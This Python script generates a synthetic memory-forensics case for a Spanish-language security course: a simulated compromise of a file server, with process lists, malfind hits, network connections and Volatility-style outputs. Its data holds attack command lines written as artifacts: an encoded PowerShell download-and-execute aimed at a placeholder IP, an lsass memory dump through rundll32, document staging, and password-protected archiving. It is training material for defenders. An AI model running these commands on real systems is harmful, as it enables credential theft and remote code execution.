#!/usr/bin/env python3
"""
generate_caso_integrador.py
============================
Genera dataset completo para el Caso Integrador de Memoria (Evaluación Parcial 2).
Escenario: Servidor de archivos comprometido con cadena de ataque completa.

Fases del ataque:
1. Initial Access: Macro maliciosa en WINWORD.EXE → PowerShell download
2. Execution: Process Hollowing en svchost.exe (beacon Cobalt Strike)
3. Credential Access: lsass.exe memory dump (mimikatz)
4. Lateral Movement: PsExec artifacts
5. Collection: Data staging en directorio temporal

Curso MAR404 - Clase 7
"""
import json, os
from datetime import datetime, timedelta

OUTPUT_DIR = "/data"

def generate_processes():
    boot = datetime(2025, 7, 15, 7, 30, 0)
    attack_start = boot + timedelta(hours=1, minutes=45)  # 09:15
    
    processes = [
        # Sistema normal
        {"pid": 4, "ppid": 0, "name": "System", "path": "N/A",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat(),
         "threads": 180, "handles": 2500},
        {"pid": 400, "ppid": 4, "name": "smss.exe", "path": "C:\\Windows\\System32\\smss.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat()},
        {"pid": 560, "ppid": 400, "name": "csrss.exe", "path": "C:\\Windows\\System32\\csrss.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat()},
        {"pid": 620, "ppid": 400, "name": "wininit.exe", "path": "C:\\Windows\\System32\\wininit.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat()},
        {"pid": 680, "ppid": 620, "name": "services.exe", "path": "C:\\Windows\\System32\\services.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat()},
        {"pid": 700, "ppid": 620, "name": "lsass.exe", "path": "C:\\Windows\\System32\\lsass.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat(),
         "threads": 8, "handles": 1200},
        {"pid": 800, "ppid": 680, "name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat(),
         "cmdline": "svchost.exe -k DcomLaunch -p", "threads": 25},
        {"pid": 900, "ppid": 680, "name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe",
         "user": "NT AUTHORITY\\NETWORK SERVICE", "create_time": boot.isoformat(),
         "cmdline": "svchost.exe -k NetworkService -p", "threads": 12},
        {"pid": 1200, "ppid": 680, "name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe",
         "user": "NT AUTHORITY\\LOCAL SERVICE", "create_time": boot.isoformat(),
         "cmdline": "svchost.exe -k LocalService -p", "threads": 8},
        {"pid": 2100, "ppid": 560, "name": "winlogon.exe", "path": "C:\\Windows\\System32\\winlogon.exe",
         "user": "NT AUTHORITY\\SYSTEM", "create_time": boot.isoformat()},
        {"pid": 2400, "ppid": 2100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe",
         "user": "FILESVR\\jrodriguez", "create_time": (boot + timedelta(minutes=2)).isoformat()},
        
        # === FASE 1: Initial Access ===
        {"pid": 3200, "ppid": 2400, "name": "WINWORD.EXE",
         "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "user": "FILESVR\\jrodriguez",
         "create_time": attack_start.isoformat(),
         "cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jrodriguez\\Downloads\\Factura_Julio_2025.docm\"",
         "is_malicious": True, "phase": "Initial Access",
         "technique": "T1566.001 - Spearphishing Attachment",
         "note": "Documento con macro maliciosa abierto por usuario"},
        
        {"pid": 3400, "ppid": 3200, "name": "powershell.exe",
         "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(seconds=30)).isoformat(),
         "cmdline": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHMAaABlAGwAbABjAG8AZABlACcAKQA=",
         "is_malicious": True, "phase": "Execution",
         "technique": "T1059.001 - PowerShell",
         "note": "PowerShell encoded spawned por macro - descarga shellcode"},
        
        # === FASE 2: Process Hollowing ===
        {"pid": 3600, "ppid": 680, "name": "svchost.exe",
         "path": "C:\\Windows\\System32\\svchost.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=1)).isoformat(),
         "cmdline": "svchost.exe",
         "threads": 3, "handles": 45,
         "is_malicious": True, "phase": "Execution",
         "technique": "T1055.012 - Process Hollowing",
         "note": "svchost.exe hollowed - Cobalt Strike beacon. PPID=services.exe pero user=jrodriguez (ANOMALÍA). Solo 3 threads y sin flags -k (ANOMALÍA)."},
        
        # === FASE 3: Credential Access ===
        {"pid": 4100, "ppid": 3600, "name": "rundll32.exe",
         "path": "C:\\Windows\\System32\\rundll32.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=10)).isoformat(),
         "cmdline": "rundll32.exe C:\\Windows\\Temp\\tmp8A3F.dll,MiniDump 700 C:\\Windows\\Temp\\lsass.dmp full",
         "is_malicious": True, "phase": "Credential Access",
         "technique": "T1003.001 - LSASS Memory",
         "note": "Dumping lsass.exe (PID 700) via rundll32 - mimikatz variant"},
        
        # === FASE 4: Lateral Movement Prep ===
        {"pid": 4400, "ppid": 3600, "name": "cmd.exe",
         "path": "C:\\Windows\\System32\\cmd.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=15)).isoformat(),
         "cmdline": "cmd.exe /c copy \\\\FILESVR\\C$\\Windows\\Temp\\PsExec.exe C:\\Windows\\Temp\\",
         "is_malicious": True, "phase": "Lateral Movement",
         "technique": "T1570 - Lateral Tool Transfer",
         "note": "Transferencia de PsExec para movimiento lateral"},
        
        {"pid": 4600, "ppid": 3600, "name": "net.exe",
         "path": "C:\\Windows\\System32\\net.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=16)).isoformat(),
         "cmdline": "net view /domain",
         "is_malicious": True, "phase": "Discovery",
         "technique": "T1018 - Remote System Discovery",
         "note": "Enumeración de sistemas en el dominio"},
        
        # === FASE 5: Data Staging ===
        {"pid": 4800, "ppid": 3600, "name": "cmd.exe",
         "path": "C:\\Windows\\System32\\cmd.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=20)).isoformat(),
         "cmdline": "cmd.exe /c for /r C:\\SharedDocs /c %i in (*.xlsx *.docx *.pdf) do copy %i C:\\Windows\\Temp\\staging\\",
         "is_malicious": True, "phase": "Collection",
         "technique": "T1074.001 - Local Data Staging",
         "note": "Recopilación de documentos sensibles para exfiltración"},
        
        {"pid": 5000, "ppid": 3600, "name": "7z.exe",
         "path": "C:\\Windows\\Temp\\7z.exe",
         "user": "FILESVR\\jrodriguez",
         "create_time": (attack_start + timedelta(minutes=22)).isoformat(),
         "cmdline": "7z.exe a -pInf3ct3d! C:\\Windows\\Temp\\backup.7z C:\\Windows\\Temp\\staging\\*",
         "is_malicious": True, "phase": "Collection",
         "technique": "T1560.001 - Archive via Utility",
         "note": "Compresión con password de datos para exfiltración"},
    ]
    return processes


def generate_malfind():
    return [
        {
            "pid": 3600, "process": "svchost.exe",
            "vad_start": "0x400000", "vad_end": "0x47FFFF",
            "protection": "PAGE_EXECUTE_READWRITE",
            "vad_type": "Private",
            "hex_dump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00\nb8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00",
            "disassembly": "0x400000: dec ebp\n0x400001: pop edx\n0x400002: nop\n...",
            "notes": "PE inyectado (MZ header) - PROCESS HOLLOWING confirmado",
            "severity": "CRITICAL"
        },
        {
            "pid": 3600, "process": "svchost.exe",
            "vad_start": "0x7F0000", "vad_end": "0x7F3FFF",
            "protection": "PAGE_EXECUTE_READWRITE",
            "vad_type": "Private",
            "hex_dump": "fc 48 83 e4 f0 48 89 e5 48 83 ec 20 48 8d 0d 00\n00 00 00 e8 00 00 00 00 48 89 c3 48 83 c3 50",
            "disassembly": "0x7F0000: cld\n0x7F0001: and rsp, 0xfffffffffffffff0\n...",
            "notes": "Shellcode x64 (fc 48 83 e4 f0 pattern) - Cobalt Strike stager",
            "severity": "CRITICAL"
        },
    ]


def generate_connections():
    return [
        {"pid": 800, "local": "0.0.0.0:135", "remote": "0.0.0.0:0",
         "state": "LISTENING", "malicious": False},
        {"pid": 900, "local": "10.0.1.50:139", "remote": "0.0.0.0:0",
         "state": "LISTENING", "malicious": False},
        {"pid": 3600, "local": "10.0.1.50:49832", "remote": "198.51.100.10:443",
         "state": "ESTABLISHED", "malicious": True,
         "notes": "Cobalt Strike C2 - HTTPS beacon"},
        {"pid": 3600, "local": "10.0.1.50:49845", "remote": "198.51.100.10:8443",
         "state": "ESTABLISHED", "malicious": True,
         "notes": "Cobalt Strike C2 - data exfil channel"},
        {"pid": 4400, "local": "10.0.1.50:49900", "remote": "10.0.1.100:445",
         "state": "ESTABLISHED", "malicious": True,
         "notes": "SMB connection to DC - lateral movement prep"},
    ]


def generate_handles():
    return [
        {"pid": 4100, "handle_type": "Process", "name": "lsass.exe (PID 700)",
         "access": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
         "notes": "rundll32 accediendo a lsass para credential dump"},
        {"pid": 3600, "handle_type": "File", "name": "C:\\Windows\\Temp\\lsass.dmp",
         "access": "FILE_WRITE_DATA", "notes": "Output del dump de lsass"},
        {"pid": 3600, "handle_type": "File", "name": "C:\\Windows\\Temp\\PsExec.exe",
         "access": "FILE_ALL_ACCESS", "notes": "PsExec descargado para lateral movement"},
        {"pid": 5000, "handle_type": "File", "name": "C:\\Windows\\Temp\\backup.7z",
         "access": "FILE_WRITE_DATA", "notes": "Archivo comprimido con datos exfiltrados"},
    ]


def generate_registry():
    return [
        {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC",
         "value": "ImagePath", "data": "C:\\Windows\\PSEXESVC.exe",
         "suspicious": True, "notes": "PsExec service registered"},
        {"key": "HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security",
         "value": "VBAWarnings", "data": "1",
         "suspicious": True, "notes": "Macros habilitadas - posible social engineering"},
    ]


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    processes = generate_processes()
    malfind = generate_malfind()
    connections = generate_connections()
    handles = generate_handles()
    registry = generate_registry()
    
    with open(f"{OUTPUT_DIR}/processes.json", "w") as f:
        json.dump(processes, f, indent=2)
    with open(f"{OUTPUT_DIR}/malfind.json", "w") as f:
        json.dump(malfind, f, indent=2)
    with open(f"{OUTPUT_DIR}/connections.json", "w") as f:
        json.dump(connections, f, indent=2)
    with open(f"{OUTPUT_DIR}/handles.json", "w") as f:
        json.dump(handles, f, indent=2)
    with open(f"{OUTPUT_DIR}/registry.json", "w") as f:
        json.dump(registry, f, indent=2)
    
    # Generar salidas tipo Volatility
    with open(f"{OUTPUT_DIR}/vol3_pslist.txt", "w") as f:
        f.write("Volatility 3 Framework 2.5.0\nPlugin: windows.pslist.PsList\n\n")
        f.write(f"{'PID':<8}{'PPID':<8}{'ImageFileName':<22}{'Threads':<10}{'Handles':<10}{'CreateTime'}\n")
        f.write("-" * 90 + "\n")
        for p in processes:
            f.write(f"{p['pid']:<8}{p['ppid']:<8}{p['name']:<22}{p.get('threads',''):<10}{p.get('handles',''):<10}{p['create_time']}\n")
    
    with open(f"{OUTPUT_DIR}/vol3_cmdline.txt", "w") as f:
        f.write("Volatility 3 Framework 2.5.0\nPlugin: windows.cmdline.CmdLine\n\n")
        for p in processes:
            if p.get("cmdline"):
                f.write(f"PID: {p['pid']} ({p['name']})\n")
                f.write(f"  {p['cmdline']}\n\n")
    
    with open(f"{OUTPUT_DIR}/vol3_netscan.txt", "w") as f:
        f.write("Volatility 3 Framework 2.5.0\nPlugin: windows.netscan.NetScan\n\n")
        f.write(f"{'Proto':<8}{'LocalAddr':<25}{'ForeignAddr':<25}{'State':<15}{'PID':<8}{'Owner'}\n")
        f.write("-" * 100 + "\n")
        for c in connections:
            proc = next((p for p in processes if p["pid"] == c["pid"]), None)
            f.write(f"{'TCPv4':<8}{c['local']:<25}{c['remote']:<25}{c['state']:<15}{c['pid']:<8}{proc['name'] if proc else ''}\n")
    
    with open(f"{OUTPUT_DIR}/vol3_malfind.txt", "w") as f:
        f.write("Volatility 3 Framework 2.5.0\nPlugin: windows.malfind.Malfind\n\n")
        for m in malfind:
            f.write(f"Process: {m['process']} PID: {m['pid']}\n")
            f.write(f"VAD: {m['vad_start']} - {m['vad_end']}\n")
            f.write(f"Protection: {m['protection']}\n")
            f.write(f"Type: {m['vad_type']}\n\n")
            f.write(f"{m['hex_dump']}\n\n")
            f.write(f"Disassembly:\n{m['disassembly']}\n\n")
            f.write("-" * 60 + "\n\n")
    
    with open(f"{OUTPUT_DIR}/vol3_handles.txt", "w") as f:
        f.write("Volatility 3 Framework 2.5.0\nPlugin: windows.handles.Handles\n\n")
        f.write(f"{'PID':<8}{'Type':<12}{'Access':<40}{'Name'}\n")
        f.write("-" * 100 + "\n")
        for h in handles:
            f.write(f"{h['pid']:<8}{h['handle_type']:<12}{h['access']:<40}{h['name']}\n")
    
    print(f"[+] Caso Integrador de Memoria generado en {OUTPUT_DIR}")
    print(f"[+] Procesos: {len(processes)} ({sum(1 for p in processes if p.get('is_malicious'))} maliciosos)")
    print(f"[+] Fases del ataque: Initial Access → Execution → Credential Access → Lateral Movement → Collection")


if __name__ == "__main__":
    main()
